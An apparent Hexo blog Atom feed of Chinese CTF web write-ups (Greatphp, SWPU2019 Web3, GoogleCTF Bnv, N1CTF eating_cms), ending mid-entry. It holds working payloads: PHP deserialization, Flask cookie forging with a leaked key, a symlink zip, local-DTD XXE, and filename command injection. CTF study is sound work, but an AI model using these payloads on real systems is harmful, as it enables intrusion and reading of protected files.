<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>1__/\/のblog</title>
  
  <subtitle>LN</subtitle>
  <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
  
  <link href="http://lll-nnn.github.io/"/>
  <updated>2021-09-10T15:03:58.085Z</updated>
  <id>http://lll-nnn.github.io/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BSidesCF 2020 Hurdles</title>
    <link href="http://lll-nnn.github.io/2021/09/10/BUU94/"/>
    <id>http://lll-nnn.github.io/2021/09/10/BUU94/</id>
    <published>2021-09-10T15:01:36.000Z</published>
    <updated>2021-09-10T15:03:58.085Z</updated>
    
    <content type="html"><![CDATA[<p>真就假猪套天下第一呗，这么多层</p><p><a href="https://blog.csdn.net/cjdgg/article/details/119881039">https://blog.csdn.net/cjdgg/article/details/119881039</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;真就假猪套天下第一呗，这么多层&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/cjdgg/article/details/119881039&quot;&gt;https://blog.csdn.net/cjdgg/article/details/119881</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="假猪套" scheme="http://lll-nnn.github.io/categories/CTF/%E5%81%87%E7%8C%AA%E5%A5%97/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="假猪套" scheme="http://lll-nnn.github.io/tags/%E5%81%87%E7%8C%AA%E5%A5%97/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战 2020 Greatphp</title>
    <link href="http://lll-nnn.github.io/2021/09/07/BUU93/"/>
    <id>http://lll-nnn.github.io/2021/09/07/BUU93/</id>
    <published>2021-09-07T14:01:28.000Z</published>
    <updated>2021-09-07T14:38:38.520Z</updated>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>给了源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;    <span class="hljs-keyword">public</span> $syc;    <span class="hljs-keyword">public</span> $lover;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, $match))&#123;               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);           &#125; <span class="hljs-keyword">else</span> &#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);           &#125;                   &#125;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;    unserialize($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>利用Error原生类绕过<code>md5</code>和<code>sha1</code>      </li></ul><p>本地测试</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">1</span>);$b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>($a != $b)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a!=b&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>(md5($a) === md5($b))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5 success&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">if</span>(sha1($a)=== sha1($b))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sha1 success&quot;</span>;&#125;</code></pre><p>测试结果<br><code>$a = new Error(&quot;llnn&quot;,1);</code>和<code>$b = new Error(&quot;llnn&quot;,2);</code>不在一行的话<code>md5</code>和<code>sha1</code>是不等的 </p><p><img src="https://s3.bmp.ovh/imgs/2021/09/565130a04e84fd98.png">      </p><p>而且<code>llnn</code>那里，也就是Error类的第一个参数是可控的，所以可以这样：<code>?&gt;&lt;?=phpinfo();?&gt;</code>但有过滤，小括号和<code>/</code>都不能用，可以直接<code>include /flag</code>;将<code>/flag</code>url编码取反绕过</p><pre><code>php &gt; echo urlencode(~&#39;/flag&#39;);%D0%99%93%9E%98php &gt; echo ~urldecode(&#39;%D0%99%93%9E%98&#39;);/flag</code></pre><p>payload：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<span class="hljs-keyword">public</span> $syc;<span class="hljs-keyword">public</span> $lover;&#125;$str = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">1</span>);$b=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$c = <span class="hljs-keyword">new</span> SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;<span class="hljs-keyword">echo</span>(urlencode(serialize($c))); <span class="hljs-meta">?&gt;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;极客大挑战-2020-Greatphp&quot;&gt;&lt;a href=&quot;#极客大挑战-2020-Greatphp&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2020]Greatphp&quot;&gt;&lt;/a&gt;[极客大挑战 2020]Greatphp&lt;/h2&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019 Web3</title>
    <link href="http://lll-nnn.github.io/2021/09/05/BUU92/"/>
    <id>http://lll-nnn.github.io/2021/09/05/BUU92/</id>
    <published>2021-09-05T14:54:41.000Z</published>
    <updated>2021-09-07T14:06:45.647Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>打开环境<br><img src="https://s3.bmp.ovh/imgs/2021/09/30ed24f91e126fbf.png"><br>随便登个admin  admin<br><img src="https://s3.bmp.ovh/imgs/2021/09/e5c98883e53ffd6e.png"><br>点击<code>upload</code>会得到<code>Permission denied!</code><br>注意到网站标题是<code>CTF-Flask-Demo</code>,所以去解一下session<br>解密脚本：</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-comment"># flask-session-cookie-manager-master  也能解session</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    decompress = <span class="hljs-literal">False</span>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):        payload = payload[<span class="hljs-number">1</span>:]        decompress = <span class="hljs-literal">True</span>    <span class="hljs-keyword">try</span>:        payload = base64_decode(payload)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)    <span class="hljs-keyword">if</span> decompress:        <span class="hljs-keyword">try</span>:            payload = zlib.decompress(payload)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    print(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))</code></pre><pre><code>PS D:\Users\L--N\Desktop\FILES\py\some&gt; python session_de.py .eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFxjxhY.YTTKww.1GFMAbE2U50IAvkhmpCtlVyULYg&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre><p>之后伪造cookie,让id为<code>b&#39;1&#39;</code>,需要key</p><p>然后，如果访问网站不存在的路由会返回<code>404 not found</code>但status是200，在响应头里有：<code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p><p>base64解码后得到：<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code>    </p><p>然后用<code>flask-session-cookie-manager</code>加密即可</p><pre><code>PS D:\Users\L--N\Desktop\FILES\flask-session-cookie-manager-master&gt; python .\flask_session_cookie_manager3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;&quot;.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTTLwQ.WmaEwPJAp37kCXwjJt6tSxM9prM</code></pre><p><code>/upload</code>页面更换cookie</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/a488570f16605e2e.png">    </p><p>得到文件上传的页面，且注释中有源码</p><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/upload&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:        <span class="hljs-keyword">return</span> render_template_string(temp)    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:        m = hashlib.md5()        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        m.update(name)        md5_one= m.hexdigest()        n = hashlib.md5()        ip = request.remote_addr        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        n.update(ip)        md5_ip = n.hexdigest()        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]        basepath=os.path.dirname(os.path.realpath(__file__))        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>        filename = f.filename        pathname = path+filename        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">-1</span>]:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):            <span class="hljs-keyword">try</span>:                os.makedirs(path_base)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):            <span class="hljs-keyword">try</span>:                os.makedirs(path)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):            <span class="hljs-keyword">try</span>:                f.save(pathname)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">try</span>:            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != <span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != <span class="hljs-number">-1</span>:waf()                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            os.system(cmd)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span>        <span class="hljs-keyword">try</span>:            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != <span class="hljs-number">-1</span>:                shutil.rmtree(path_base)                os.mkdir(path_base)                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()            resp = make_response(image)            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>            <span class="hljs-keyword">return</span> resp        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            shutil.rmtree(path_base)            os.mkdir(path_base)            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<span class="hljs-meta">@app.route(&#x27;/showflag&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showflag</span>():</span>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read()        resp = make_response(image)        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>        <span class="hljs-keyword">return</span> resp    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span></code></pre><p>两个路由，第一个要求上传个图片压缩包，第二个说明flag在flask根目录下的flag里的flag.jpg中</p><p><code>showflag()</code>路由的<code>True==False</code>是恒<code>False</code>的，所以不能通过第二个路由拿到flag，这里通过第一个路由上传个软链接读取文件      </p><p><code>ln -s</code>是Linux的一种软连接，相当于Windows的快捷方式<br>比如</p><pre><code>┌──(root💀kali)-[~/桌面]└─# ln -s /etc/passwd test       </code></pre><p>打开<code>test</code>中就是<code>/etc/passwd</code>中的内容了        </p><p><code>/proc/self</code> 记录了系统运行的信息状态等,<code>cwd</code>指向当前进程运行目录的一个符号链接,即flask运行进程目录      </p><p>payload:   </p><pre><code>┌──(root💀kali)-[~]└─# ln -s /proc/self/cwd/flag/flag.jpg test┌──(root💀kali)-[~]└─# zip -ry test.zip test</code></pre><p>然后将<code>test.zip</code>上传即可得到flag<br><img src="https://s3.bmp.ovh/imgs/2021/09/f2435ead4e20cf6f.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SWPU2019-Web3&quot;&gt;&lt;a href=&quot;#SWPU2019-Web3&quot; class=&quot;headerlink&quot; title=&quot;[SWPU2019]Web3&quot;&gt;&lt;/a&gt;[SWPU2019]Web3&lt;/h2&gt;&lt;p&gt;打开环境&lt;br&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="flask" scheme="http://lll-nnn.github.io/categories/CTF/flask/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="flask" scheme="http://lll-nnn.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>Bnv</title>
    <link href="http://lll-nnn.github.io/2021/08/01/BUU91/"/>
    <id>http://lll-nnn.github.io/2021/08/01/BUU91/</id>
    <published>2021-08-01T04:10:36.000Z</published>
    <updated>2021-08-01T04:44:32.664Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/08/5a5f87e50976a9cd.png"><br><code>submit</code>抓包   </p><pre><code>POST /api/search HTTP/1.1Host: c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-type: application/jsonContent-Length: 38Origin: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnConnection: closeReferer: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn/&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;       </code></pre><p><code>json</code><br>尝试sqli，不行<br>有json的地方可能存在<code>xxe</code><br><code>Content-type</code>改为<code>application/xml</code>   </p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (#PCDATA)&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;message&gt;&amp;xxe;&lt;/message&gt;</code></pre><p>返回<code>No result found</code>     </p><p>看来不行    </p><p>WP：</p><p><a href="https://www.dazhuanlan.com/xlllovelife/topics/1220539"><code>利用本地DTD文件进行XXE</code></a>       </p><p>payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;&#39;&gt;%local_dtd;]&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GoogleCTF2019-Quals-Bnv&quot;&gt;&lt;a href=&quot;#GoogleCTF2019-Quals-Bnv&quot; class=&quot;headerlink&quot; title=&quot;[GoogleCTF2019 Quals]Bnv&quot;&gt;&lt;/a&gt;[GoogleCTF2019 Q</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="xxe" scheme="http://lll-nnn.github.io/categories/CTF/xxe/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="xxe" scheme="http://lll-nnn.github.io/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>Eating_cms</title>
    <link href="http://lll-nnn.github.io/2021/08/01/BUU90/"/>
    <id>http://lll-nnn.github.io/2021/08/01/BUU90/</id>
    <published>2021-08-01T03:49:47.000Z</published>
    <updated>2021-08-01T04:27:07.094Z</updated>
    
    <content type="html"><![CDATA[<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><h4 id="parse-url-解析漏洞"><a href="#parse-url-解析漏洞" class="headerlink" title="parse_url()解析漏洞"></a><code>parse_url()</code>解析漏洞</h4><ul><li><p><code>function.php</code>中</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    $keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];    $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);    parse_str($uri[<span class="hljs-string">&#x27;query&#x27;</span>], $query);<span class="hljs-comment">//    var_dump($query);</span><span class="hljs-comment">//    die();</span>    <span class="hljs-keyword">foreach</span>($keywords <span class="hljs-keyword">as</span> $token)    &#123;        <span class="hljs-keyword">foreach</span>($query <span class="hljs-keyword">as</span> $k =&gt; $v)        &#123;            <span class="hljs-keyword">if</span> (stristr($k, $token))                hacker();            <span class="hljs-keyword">if</span> (stristr($v, $token))                hacker();        &#125;    &#125;&#125;</code></pre><p><code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><p>这样就会被匹配到，不能读取；但是如果这样<code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code>parse_url就会返回<code>false</code>；读取成功。</p><p><img src="https://ftp.bmp.ovh/imgs/2021/08/777d762da5a7bc08.png"></p><p><strong>漏洞问题只存在于php5.4.7以前</strong></p><hr><p>真正的上传地址<code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=m4aaannngggeee</code></p><pre><code class="hljs php"><span class="hljs-comment">//upllloadddd.php</span><span class="hljs-meta">&lt;?php</span>$allowtype = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);$size = <span class="hljs-number">10000000</span>;$path = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;$filename = $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-keyword">if</span>(is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>(!move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);&#125;$newfile = $path.$filename;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $filename;$picdata = system(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);  <span class="hljs-comment">//system命令执行，抓包改filename即可</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.$picdata.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<span class="hljs-keyword">if</span>($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;    unlink($newfile);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);&#125;$ext = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<span class="hljs-keyword">if</span>(!in_array($ext,$allowtype))&#123;    unlink($newfile);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload：</p><blockquote><p><code>;cd ..;ls;#</code></p><p><code>;cd ..;cat flag_233333;#</code></p><p><strong><strong>****</strong></strong>或者*<strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></p><pre><code class="hljs php">|| `<span class="hljs-keyword">echo</span> bHMgLw== |base64 -d`ls /|| `<span class="hljs-keyword">echo</span> Y2F0IC9mbGFnXzIzMzMzMyA= |base64 -d` cat /flag_233333</code></pre></blockquote></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;N1CTF-2018-eating-cms&quot;&gt;&lt;a href=&quot;#N1CTF-2018-eating-cms&quot; class=&quot;headerlink&quot; title=&quot;[N1CTF 2018]eating_cms&quot;&gt;&lt;/a&gt;[N1CTF 2018]eating_cms</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="rce" scheme="http://lll-nnn.github.io/categories/CTF/rce/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="rce" scheme="http://lll-nnn.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>异或^</title>
    <link href="http://lll-nnn.github.io/2021/07/14/%E5%BC%82%E6%88%96/"/>
    <id>http://lll-nnn.github.io/2021/07/14/%E5%BC%82%E6%88%96/</id>
    <published>2021-07-13T23:47:42.000Z</published>
    <updated>2021-08-01T04:44:17.726Z</updated>
    
